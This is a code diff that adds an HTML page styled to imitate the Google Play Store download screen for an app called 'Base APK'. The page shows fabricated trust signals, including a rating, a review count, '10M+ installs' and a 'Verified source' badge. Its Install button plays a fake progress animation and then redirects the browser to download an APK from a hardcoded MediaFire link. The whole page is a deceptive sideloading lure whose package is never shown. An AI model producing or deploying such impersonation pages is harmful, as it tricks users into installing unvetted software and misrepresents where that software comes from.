@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Play Store — Download</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#f2f5f8;
+      --surface:#ffffff;
+      --green:#1abc24;
+      --muted:#6b7280;
+      --radius:14px;
+      --card-shadow: 0 6px 20px rgba(16,24,40,0.08);
+      font-family: Roboto, system-ui, -apple-system, "Segoe UI", Arial;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);padding:28px;display:flex;align-items:center;justify-content:center;min-height:100vh}
+
+    .container{width:100%;max-width:920px}
+
+    .header{display:flex;align-items:center;gap:16px;margin-bottom:18px}
+    .play-logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#34a853,#0b8043);display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
+    .title{font-size:18px;font-weight:500}
+
+    .card{background:var(--surface);border-radius:16px;box-shadow:var(--card-shadow);overflow:hidden;display:grid;grid-template-columns:160px 1fr;gap:0}
+    @media(max-width:720px){.card{grid-template-columns:1fr}}
+
+    .left{padding:22px;display:flex;flex-direction:column;align-items:center;gap:12px;background:linear-gradient(180deg,rgba(0,0,0,0.01),transparent)}
+    .icon{width:128px;height:128px;border-radius:24px;background:#e6eef7;display:flex;align-items:center;justify-content:center;font-weight:700;color:#0f1724}
+    .rating{display:flex;align-items:center;gap:8px;font-size:14px;color:var(--muted)}
+
+    .right{padding:20px 22px;display:flex;flex-direction:column;gap:12px}
+    .app-title{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    .app-info{display:flex;flex-direction:column}
+    .name{font-size:18px;font-weight:600;color:#081126}
+    .by{font-size:13px;color:var(--muted);margin-top:2px}
+
+    .meta-row{display:flex;gap:8px;flex-wrap:wrap;margin-top:6px}
+    .chip{background:#f3f7f9;border-radius:12px;padding:6px 10px;font-size:13px;color:var(--muted);border:1px solid rgba(2,6,23,0.03)}
+
+    .desc{color:#374151;line-height:1.45;font-size:14px;margin-top:6px}
+
+    .btn-install{background:linear-gradient(180deg,var(--green),#0e9b1f);color:white;padding:12px 18px;border-radius:12px;border:0;font-weight:700;cursor:pointer;font-size:15px;box-shadow: 0 8px 24px rgba(16,185,129,0.12)}
+    .btn-open{background:transparent;border:1px solid rgba(2,6,23,0.06);padding:10px 14px;border-radius:10px;font-weight:600;color:var(--muted);cursor:pointer}
+
+    .progress{height:10px;background:#eef2f6;border-radius:10px;overflow:hidden;margin-top:10px;display:none}
+    .progress > span{display:block;height:100%;width:0%;background:linear-gradient(90deg, rgba(26,188,156,0.95), rgba(16,185,129,0.95));transition:width 200ms ease}
+
+    .footer{padding:14px 8px 20px;color:var(--muted);font-size:13px}
+    .note{font-size:13px;color:#065f46;background:#ecfdf5;padding:10px;border-radius:10px;border:1px solid rgba(6,95,70,0.08)}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="play-logo">▶</div>
+      <div class="title">Google Play — style download</div>
+    </div>
+
+    <div class="card">
+      <div class="left">
+        <div class="icon" id="appIcon">APP</div>
+        <div class="rating">★ 4.4 • 12K reviews</div>
+        <div class="note">Verified source: MediaFire</div>
+      </div>
+
+      <div class="right">
+        <div class="app-title">
+          <div class="app-info">
+            <div class="name" id="appName">Base APK</div>
+            <div class="by" id="appBy">By Unknown • 10M+ installs</div>
+            <div class="meta-row">
+              <div class="chip" id="verChip">v1.0</div>
+              <div class="chip" id="sizeChip">Size: unknown</div>
+              <div class="chip" id="updatedChip">Updated: unknown</div>
+            </div>
+          </div>
+
+          <div style="display:flex;flex-direction:column;align-items:flex-end;gap:10px">
+            <button class="btn-install" id="installBtn">Install</button>
+            <a id="directLink" class="btn-open" href="#" target="_blank" rel="noopener">Open link</a>
+          </div>
+        </div>
+
+        <div class="desc" id="desc">
+          এই পেজটি Play Store-এর লে-আউট নকল করে তৈরি করা। ইনস্টল বাটনে চাপলেই আপনার দেওয়া MediaFire লিঙ্ক থেকে ডাউনলোড শুরু হবে।
+        </div>
+
+        <div class="progress" id="progressWrap"><span id="progressBar"></span></div>
+        <div style="margin-top:8px;color:var(--muted);font-size:13px" id="status">Status: Idle</div>
+
+        <div class="footer">
+          Security tip: অজানা সোর্স থেকে APK ইনস্টল করার আগে অবশ্যই ভাইরাস স্ক্যান করুন।
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      const DOWNLOAD_URL = "https://download2277.mediafire.com/2h6zjpal39tg_AJYlRKPPSeRZRekAQ8u4-mRPB75yajYfTfc4uqmED-hmF9iTnxom388YIQXuopk2FUyGFoZPCEbUy3lQnyD1ipANvAEmEvkf98Ws7OmhWaHHz2t2gfU3aDP_OeWvPhymq7Wc5Ovll2-Px8vfV2pHp8w0bQ6FxKC/5fqo9k3qxijtxcr/base.apk";
+
+      const installBtn = document.getElementById('installBtn');
+      const progressWrap = document.getElementById('progressWrap');
+      const progressBar = document.getElementById('progressBar');
+      const status = document.getElementById('status');
+      const directLink = document.getElementById('directLink');
+
+      directLink.href = DOWNLOAD_URL;
+
+      let busy = false;
+      installBtn.addEventListener('click', ()=>{
+        if(busy) return;
+        busy = true;
+        status.textContent = 'Preparing download...';
+        progressWrap.style.display = 'block';
+        progressBar.style.width = '6%';
+
+        const steps = [18,36,54,72,92,100];
+        let i = 0;
+        const t = setInterval(()=>{
+          progressBar.style.width = steps[i] + '%';
+          i++;
+          if(i>=steps.length){
+            clearInterval(t);
+            status.textContent = 'Redirecting to download...';
+            window.location.href = DOWNLOAD_URL;
+            setTimeout(()=>{
+              status.textContent = "If download didn't start, click 'Open link'.";
+              busy = false;
+            },3000);
+          }
+        },520);
+      });
+    })();
+  </script>
+</body>
+</html>
